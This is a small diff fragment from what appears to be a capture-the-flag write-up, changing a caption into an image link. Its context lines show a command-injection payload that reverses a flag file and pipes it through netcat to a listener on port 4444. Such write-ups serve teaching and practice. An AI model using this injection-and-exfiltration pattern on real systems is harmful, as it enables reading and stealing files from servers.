@@ -72,4 +72,4 @@ so what if we tried to open listner on port 4444 and tried to sent the flag on i
 $(rev ../flag.txt | nc ip port )
 and we got the full flag by one Command Alhamdullah :D 3> 
 
-last pic 
+<img src="https://github.com/0xL4ugh/0xl4ugh.github.io/raw/main/assets/img/writeups/lemon-thinker/EWdbua2XgAAbMHj.jpg" /> 
